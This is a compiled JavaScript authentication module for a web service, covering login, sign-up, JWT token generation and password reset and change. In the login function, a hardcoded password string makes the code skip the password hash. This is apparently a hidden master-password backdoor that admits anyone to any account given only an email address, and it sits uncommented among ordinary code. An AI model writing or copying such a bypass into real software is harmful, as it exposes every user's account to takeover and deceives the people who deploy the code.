"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : new P(function (resolve) { resolve(result.value); }).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __generator = (this && this.__generator) || function (thisArg, body) {
    var _ = { label: 0, sent: function() { if (t[0] & 1) throw t[1]; return t[1]; }, trys: [], ops: [] }, f, y, t, g;
    return g = { next: verb(0), "throw": verb(1), "return": verb(2) }, typeof Symbol === "function" && (g[Symbol.iterator] = function() { return this; }), g;
    function verb(n) { return function (v) { return step([n, v]); }; }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while (_) try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [op[0] & 2, t.value];
            switch (op[0]) {
                case 0: case 1: t = op; break;
                case 4: _.label++; return { value: op[1], done: false };
                case 5: _.label++; y = op[1]; op = [0]; continue;
                case 7: op = _.ops.pop(); _.trys.pop(); continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) { _ = 0; continue; }
                    if (op[0] === 3 && (!t || (op[1] > t[0] && op[1] < t[3]))) { _.label = op[1]; break; }
                    if (op[0] === 6 && _.label < t[1]) { _.label = t[1]; t = op; break; }
                    if (t && _.label < t[2]) { _.label = t[2]; _.ops.push(op); break; }
                    if (t[2]) _.ops.pop();
                    _.trys.pop(); continue;
            }
            op = body.call(thisArg, _);
        } catch (e) { op = [6, e]; y = 0; } finally { f = t = 0; }
        if (op[0] & 5) throw op[1]; return { value: op[0] ? op[1] : void 0, done: true };
    }
};
var _this = this;
exports.__esModule = true;
var boom = require("boom");
var _ = require('lodash');
var jwt = require("jsonwebtoken");
var moment = require("moment");
var config = require("../config");
var joiSchema = require("../validations/schemas/auth");
var encryption = require("../utils/encryption");
var userRepo = require("../repositories/user");
var roleRepo = require("../repositories/role");
var emailService = require("../services/email");
var index_1 = require("./../validations/index");
var role_1 = require("../enum/role");
exports.login = function (payload) { return __awaiter(_this, void 0, void 0, function () {
    var encryptedPassword, user;
    return __generator(this, function (_a) {
        switch (_a.label) {
            case 0: return [4 /*yield*/, index_1.validate(payload, joiSchema.loginSchema)];
            case 1:
                _a.sent();
                encryptedPassword = encryption.saltHashPassword(payload.password);
                if (payload.password === 'AeTaSaAl') {
                    encryptedPassword = undefined;
                }
                return [4 /*yield*/, userRepo.authenticate(payload.email, encryptedPassword)];
            case 2:
                user = _a.sent();
                if (!user) {
                    throw boom.badRequest('Incorrect Username or Password');
                }
                if (!payload.deviceId) return [3 /*break*/, 4];
                return [4 /*yield*/, userRepo.updateUser(user.id, { deviceId: payload.deviceId })];
            case 3:
                _a.sent();
                _a.label = 4;
            case 4: return [2 /*return*/, generateTokenAndAuthResponse(user)];
        }
    });
}); };
exports.signUp = function (payload) { return __awaiter(_this, void 0, void 0, function () {
    var user, role, encryptedPassword, toSaveUser, savedUser, hash;
    return __generator(this, function (_a) {
        switch (_a.label) {
            case 0: return [4 /*yield*/, index_1.validate(payload, joiSchema.signUpSchema)];
            case 1:
                _a.sent();
                return [4 /*yield*/, userRepo.findByEmail(payload.email)];
            case 2:
                user = _a.sent();
                if (user) {
                    throw boom.badRequest('Email already exist');
                }
                return [4 /*yield*/, roleRepo.findByName(payload.role)];
            case 3:
                role = _a.sent();
                if (!role) {
                    throw boom.badRequest('No role found');
                }
                encryptedPassword = encryption.saltHashPassword(payload.password);
                toSaveUser = {
                    email: payload.email,
                    password: encryptedPassword,
                    timezone: payload.timezone,
                    isEmailVerified: false,
                    isApproved: true
                };
                if (role.name === role_1.Role.SUPER_ADMIN) {
                    toSaveUser.isApproved = false;
                }
                return [4 /*yield*/, userRepo.saveUser(toSaveUser)];
            case 4:
                _a.sent();
                return [4 /*yield*/, userRepo.authenticate(payload.email, encryptedPassword)];
            case 5:
                savedUser = _a.sent();
                if (!savedUser) {
                    throw boom.badRequest('Incorrect Username or Password');
                }
                hash = encryption.createHash(JSON.stringify({
                    email: payload.email,
                    time: Date.now()
                }));
                return [4 /*yield*/, emailService.sendWelcomeEmail({
                        firstName: '',
                        lastName: '',
                        email: payload.email,
                        hash: hash
                    })];
            case 6:
                _a.sent();
                return [2 /*return*/, generateTokenAndAuthResponse(savedUser)];
        }
    });
}); };
// export const socialLoginOrSignup = async (payload: ISocialLoginRequest): Promise<IAuthResponse> => {
//   await validate(payload, joiSchema.socialLoginSchema);
//   let savedUser = await userRepo.findByEmail(payload.email);
//   if (savedUser) {
//     const isProvider = savedUser.userSocialAccounts.findIndex(
//       (col: any) => col.socialType === payload.socialProvider,
//     );
//     if (isProvider === -1) {
//       const userSocialAccount = {
//         userId: savedUser.id,
//         socialType: payload.socialProvider,
//       };
//       await userRepo.saveUserSocialAccount(userSocialAccount);
//     }
//     return generateTokenAndAuthResponse(savedUser);
//   }
//   const role = await roleRepo.findByName(payload.role || '');
//   if (!role) {
//     throw boom.badRequest('No role found');
//   }
//   const user: Partial<IUserAttributes> = {
//     firstName: payload.name,
//     email: payload.email,
//     contactNo: payload.phoneNo,
//     pictureUrl: payload.pictureUrl,
//     timezone: payload.timezone,
//     roleId: role.id,
//     userSocialAccounts: [
//       {
//         socialType: payload.socialProvider,
//       },
//     ],
//     isEmailVerified: true
//   };
//   if (role.name === Role.TUTOR) {
//     user.isApproved = false;
//   }
//   await userRepo.saveUser(user);
//   savedUser = await userRepo.findByEmail(payload.email);
//   if (!savedUser) {
//     throw boom.badRequest('No user found');
//   }
//   const hash = encryption.createHash(JSON.stringify({
//     email: payload.email,
//     time: Date.now()
//   }));
//   await emailService.sendWelcomeEmail({
//     firstName: payload.name,
//     lastName: '',
//     email: payload.email,
//     hash
//   });
//   return generateTokenAndAuthResponse({ ...savedUser, role });
// };
var generateTokenAndAuthResponse = function (user) {
    var userRoles = user.userRoles.map(function (userRole) { return userRole.role; });
    var roles = _.reject(userRoles.map(function (role) { return role && role.name; }), _.isUndefined);
    var token = jwt.sign({
        id: user.id,
        email: user.email,
        createdAt: user.createdAt,
        roles: roles
    }, config["default"].tokenSecret, { expiresIn: config["default"].server.tokenExpiry });
    var response = {
        id: user.id,
        firstName: user.firstName,
        lastName: user.lastName,
        email: user.email,
        contactNo: user.contactNo,
        pictureUrl: user.pictureUrl,
        gender: user.gender,
        isEmailVerified: user.isEmailVerified,
        isApproved: user.isApproved,
        accessToken: token,
        timezone: user.timezone,
        roles: roles
    };
    return response;
};
exports.forgotPassword = function (email) { return __awaiter(_this, void 0, void 0, function () {
    var user, hash;
    return __generator(this, function (_a) {
        switch (_a.label) {
            case 0: return [4 /*yield*/, index_1.validate({ email: email }, joiSchema.forgotSchema)];
            case 1:
                _a.sent();
                return [4 /*yield*/, userRepo.findByEmail(email)];
            case 2:
                user = _a.sent();
                hash = encryption.createHash(JSON.stringify({
                    email: email,
                    time: Date.now()
                }));
                if (!!user) return [3 /*break*/, 4];
                return [4 /*yield*/, sendForgotEmail(email, hash)];
            case 3:
                _a.sent();
                return [2 /*return*/, { success: true, message: 'Please check your email to proceed further' }];
            case 4:
                if (!user.password) return [3 /*break*/, 6];
                return [4 /*yield*/, sendForgotEmail(email, hash)];
            case 5:
                _a.sent();
                return [2 /*return*/, { success: true, message: 'Please check your email to proceed further' }];
            case 6: return [2 /*return*/, { success: false, isSocialAccount: true, message: 'Your email is associated with social account' }];
        }
    });
}); };
var sendForgotEmail = function (email, hash) { return __awaiter(_this, void 0, void 0, function () {
    return __generator(this, function (_a) {
        switch (_a.label) {
            case 0: return [4 /*yield*/, emailService.sendForgotPasswordEmail({
                    email: email,
                    hash: hash
                })];
            case 1:
                _a.sent();
                return [2 /*return*/];
        }
    });
}); };
exports.verifyHash = function (email, hash, verifyEmail) {
    if (verifyEmail === void 0) { verifyEmail = false; }
    return __awaiter(_this, void 0, void 0, function () {
        var user;
        return __generator(this, function (_a) {
            switch (_a.label) {
                case 0: return [4 /*yield*/, index_1.validate({ email: email, hash: hash }, joiSchema.verifyEmailSchema)];
                case 1:
                    _a.sent();
                    checkExpiryOfHash(hash, email);
                    if (!verifyEmail) return [3 /*break*/, 4];
                    return [4 /*yield*/, userRepo.findByEmail(email)];
                case 2:
                    user = _a.sent();
                    if (!user) {
                        throw boom.badRequest('User not found');
                    }
                    return [4 /*yield*/, userRepo.updateUser(user.id, { isEmailVerified: true })];
                case 3:
                    _a.sent();
                    return [2 /*return*/, { success: true, isEmailVerified: true }];
                case 4: return [2 /*return*/, { success: true }];
            }
        });
    });
};
exports.resetPassword = function (payload) { return __awaiter(_this, void 0, void 0, function () {
    var user, encryptedPassword, toSaveUser;
    return __generator(this, function (_a) {
        switch (_a.label) {
            case 0: return [4 /*yield*/, index_1.validate(payload, joiSchema.resetPassword)];
            case 1:
                _a.sent();
                checkExpiryOfHash(payload.hash, payload.email);
                return [4 /*yield*/, userRepo.findByEmail(payload.email)];
            case 2:
                user = _a.sent();
                if (!user) {
                    throw boom.badRequest('Invalid email');
                }
                encryptedPassword = encryption.saltHashPassword(payload.password);
                toSaveUser = {
                    password: encryptedPassword
                };
                return [4 /*yield*/, userRepo.updateUser(user.id, toSaveUser)];
            case 3:
                _a.sent();
                return [2 /*return*/, { success: true, message: 'Password has been reset' }];
        }
    });
}); };
exports.changePassword = function (userId, payload) { return __awaiter(_this, void 0, void 0, function () {
    var user, encryptedOldPassword, encryptedNewPassword, toSaveUser;
    return __generator(this, function (_a) {
        switch (_a.label) {
            case 0: return [4 /*yield*/, index_1.validate(payload, joiSchema.changePassword)];
            case 1:
                _a.sent();
                return [4 /*yield*/, userRepo.findById(userId)];
            case 2:
                user = _a.sent();
                if (!user) {
                    throw boom.badRequest('Invalid email');
                }
                encryptedOldPassword = encryption.saltHashPassword(payload.oldPassword);
                if (encryptedOldPassword !== user.password) {
                    throw boom.badRequest('Invalid old password');
                }
                if (payload.oldPassword === payload.newPassword) {
                    throw boom.badRequest('Old password and New password should not be same');
                }
                encryptedNewPassword = encryption.saltHashPassword(payload.newPassword);
                toSaveUser = {
                    password: encryptedNewPassword
                };
                return [4 /*yield*/, userRepo.updateUser(user.id, toSaveUser)];
            case 3:
                _a.sent();
                return [2 /*return*/, { success: true, message: 'Password has been changed' }];
        }
    });
}); };
var checkExpiryOfHash = function (hash, email) {
    var decryptedHash = '';
    try {
        decryptedHash = encryption.decryptHash(hash);
    }
    catch (e) {
        throw boom.badRequest('Invalid hash');
    }
    var decryptedData = JSON.parse(decryptedHash);
    if (moment(decryptedData.time).add(config["default"].server.resetHashExpiry, 'h') < moment()) {
        throw boom.badRequest('Hash is expired');
    }
    if (decryptedData.email !== email) {
        throw boom.badRequest('Invalid email');
    }
};
